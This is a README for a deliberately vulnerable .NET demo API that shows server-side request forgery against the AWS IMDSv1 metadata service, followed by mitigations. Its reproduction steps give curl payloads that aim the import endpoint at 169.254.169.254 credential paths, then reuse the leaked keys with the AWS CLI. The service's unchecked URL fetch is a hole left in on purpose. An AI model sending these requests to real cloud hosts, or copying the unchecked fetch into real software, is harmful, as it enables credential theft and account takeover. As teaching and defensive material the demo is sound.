# SSRF Demo Project

## Purpose

This repository demonstrates SSRF (Sever Side Request Forgery) attack on AWS IMDSv1 service.

## Business Scenario

This project builds an API service for an imaginary AI RAG tool. The AI RAG tool allows user to import external contents
so that the tool can answer questions based on the content that has been stored. At this moment, the supported content
type is only PDF.

According to the imaginary solution, the tool calls `POST /import-external-content-from-url` to import a PDF from an
external URL. If the fetched content is PDF, the API should save it to the database. In this demo project, the API will
simply return 200 OK with a message. If the content from the URL is not PDF, the application will return 400 Bad Request
with an error message with the fetched content for debugging purpose.

## Tech Stack

- .NET 9
- FastEndpoints
- Docker

This API service is published as a Docker image on GitHub Container Registry. You can run it with
`docker run -p 8080:8080 ghcr.io/xudong-yang/aws-imds-v1-ssrf-demo:latest`.

## API Specification

Here are two APIs in this service.

1. `GET /` Hello world API (anonymous)
2. `POST /import-external-content-from-url` (anonymous)

For POST import API, there must be a `Content-Type: application/json` header and the payload must have a url.

Example cURL command for happy path:

```shell
curl -X POST --location "http://localhost:8080/import-external-content-from-url" \
    -H "Content-Type: application/json" \
    -d '{
            "url": "https://pdfobject.com/pdf/sample.pdf"
        }'
```

This will return:

```shell
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{
  "error": null,
  "message": "external content imported"
}
```

For unhappy path, pass in something that is not PDF:

```shell
curl -X POST --location "http://localhost:8080/import-external-content-from-url" \
    -H "Content-Type: application/json" \
    -d '{
            "url": "https://json.org/img/json160.gif"
        }'
```

This will return:

```shell
HTTP/1.1 400 Bad Request
Content-Type: application/json; charset=utf-8

{
  "error": "unable to import. File content: GIF89a_and_a_lot_of_grabled_texts",
  "message": null
}
```

## SSRF Demonstration

This API service is vulnerable to SSRF attack because the caller fully controls the URL to be fetched. When this API
service is deployed on AWS EC2 environment (could be other services which rely on EC2, for example, ECS, EKS, Elastic
Beanstalk etc.), the caller can pass in IMDS API request, and the API service will perform the request.

### Step to reproduce:

1. Launch an EC2 instance with below user data. This will install Docker automatically;
    ```shell
    #!/bin/bash
    dnf update -y
    dnf install -y docker
    systemctl start docker
    systemctl enable docker
    usermod -a -G docker ec2-user
    ```
2. Make sure IMDSv1 is enabled;
3. Edit the security group. Allow inbound traffic on 8080 port from your own IP address;
4. (Optional) Attach an IAM role to the instance;
5. Connect to the instance, run `docker ps` to verify Docker is successfully installed. If not, check below for
   debugging tips;
6. Run `docker run -p 8080:8080 ghcr.io/xudong-yang/aws-imds-v1-ssrf-demo:latest` to start the API service;
7. From the EC2 instance page, find the public DNS name. From you local computer, call the API like this:
    ```shell
    curl -X POST --location "http://public_dns_name:8080/import-external-content-from-url" \
    -H "Content-Type: application/json" \
    -d '{
            "url": "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"
        }'
    ```
   If you have attached an IAM role, you can also call the API like this:
    ```shell
    curl -X POST --location "http://{public_dns_name}:8080/import-external-content-from-url" \
    -H "Content-Type: application/json" \
    -d '{
            "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
        }'
    ```
   By calling the API, you will get something like this from the response:

   ```shell
   HTTP/1.1 400 Bad Request
   Content-Type: application/json; charset=utf-8
   Date: Sat, 31 Jan 2026 11:50:14 GMT
   Server: Kestrel
   Transfer-Encoding: chunked
   
   {
   "error": "unable to import. File content: {\n  \"Code\" : \"Success\",\n  \"LastUpdated\" : \"2026-01-31T11:41:54Z\",\n  \"Type\" : \"AWS-HMAC\",\n  \"AccessKeyId\" : \"xxx\",\n  \"SecretAccessKey\" : \"xxx\",\n  \"Token\" : \"xxx\",\n  \"Expiration\" : \"2026-01-31T17:45:22Z\"\n}",
   "message": null
   }
   ``` 
   This is a successful SSRF attack. The API service running on the EC2 has made a request to IMDS and exposed the confidential information to the caller; 
8. Now we can get advantage of these token. Note down the secrets from the previous response. On your local computer, set the environmental variables like this: 
   ```shell
   export AWS_ACCESS_KEY_ID=xxx
   export AWS_SECRET_ACCESS_KEY=xxx
   export AWS_SESSION_TOKEN=xxx
   ```
9. Run `aws sts get-caller-identity`. From the ARN, you can confirm that your current AWS CLI is authentciated as `assumed-role/aws:ec2-instance/instance-id` (if using the EC2 instance credential) or `assumed-role/role-name/instance-id` (if using the IAM credential)


__What if Docker is not installed successfully?__

1. If Docker command is not found, run `sudo cloud-init status` and verify cloud-init is completed. Can also run
   `sudo cat /var/log/cloud-init-output.log` to check the cloud-init log;
2. If `docker ps` gets permission denied, log out and reconnect to the instance. Chances are the session is established
   before the user data finishes running, so the user group change hasn't taken effect for the current session;
3. The user data is written for distributions of the Red Hat family. It works on Amazon Linux 2023. If you choose a
   different AMI, edit the user data script accordingly. 

### How to mitigate this issue

1. In the EC2 instance settings, require IMDSv2. The v2 version of IMDSv2 makes significant security improvements, including authentication and a hop limit (which restricts how many network layers away from the instance host can IMDS be called). After requiring IMDSv2, the same SSRF attack of this project will not be successful. Those attack will cause 500 Internal Error, and from the container log, we can see below errors:
   ```shell
   info: System.Net.Http.HttpClient.Default.LogicalHandler[101]
      End processing HTTP request after 63.6798ms - 401
   fail: Microsoft.AspNetCore.Server.Kestrel[13]
   Connection id "0HNJ0NQQIBNND", Request id "0HNJ0NQQIBNND:00000001": An unhandled exception was thrown by the application.
   System.Net.Http.HttpRequestException: Response status code does not indicate success: 401 (Unauthorized).
   at System.Net.Http.HttpResponseMessage.EnsureSuccessStatusCode()
   at SsrfDemo.Feature.ImportExternalContentFromUrl.CommandHandler.ExecuteAsync(Command command, CancellationToken ct) in /src/Feature/ImportExternalContentFromUrl/Command.cs:line 12
   at SsrfDemo.Feature.ImportExternalContentFromUrl.Endpoint.HandleAsync(Request req, CancellationToken ct) in /src/Feature/ImportExternalContentFromUrl/Endpoint.cs:line 23
   at FastEndpoints.Endpoint`2.ExecAsync(CancellationToken ct)
            at FastEndpoints.Endpoint`2.ExecAsync(CancellationToken ct)
   at Microsoft.AspNetCore.Server.Kestrel.Core.Internal.Http.HttpProtocol.ProcessRequests[TContext](IHttpApplication`1 application)
   ```
   This means that the service still performs a GET request to the URL provided by the caller, but the call isn't successful (get 401 Unauthorized). This is because we have not yet made a token request to IMDS yet. In the context of this app, it's impossible to perform such request because the method of token request is PUT ([More information about IMDSv2 and IMDSv1](https://aws.amazon.com/blogs/security/get-the-full-benefits-of-imdsv2-and-disable-imdsv1-across-your-aws-infrastructure/)); 
2. From the application design perspective, it is better to let the user upload a file (different security considerations apply to this practice) instead of letting user supply a URL; 
3. If the URL needs to come from the user, user input sanitation is needed. Local URL should not be allowed in the context of this app; 
4. Follow PoLP (Principle of Least Privilege) for IAM permission management. 
